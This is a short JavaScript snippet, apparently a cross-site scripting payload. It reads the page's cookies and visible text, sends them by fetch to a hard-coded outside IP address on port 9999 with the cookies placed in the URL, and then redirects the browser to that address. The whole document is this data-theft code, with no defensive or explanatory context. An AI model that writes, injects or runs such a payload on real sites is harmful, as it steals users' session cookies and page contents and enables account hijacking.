const cookie = document.cookie;
const textContent = document.body.innerText;
const targetServer = "http://139.224.199.99:9999/";
const target = targetServer + "cookie?" + cookie

fetch(target, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        result: textContent
    })
})

window.location.replace(target);
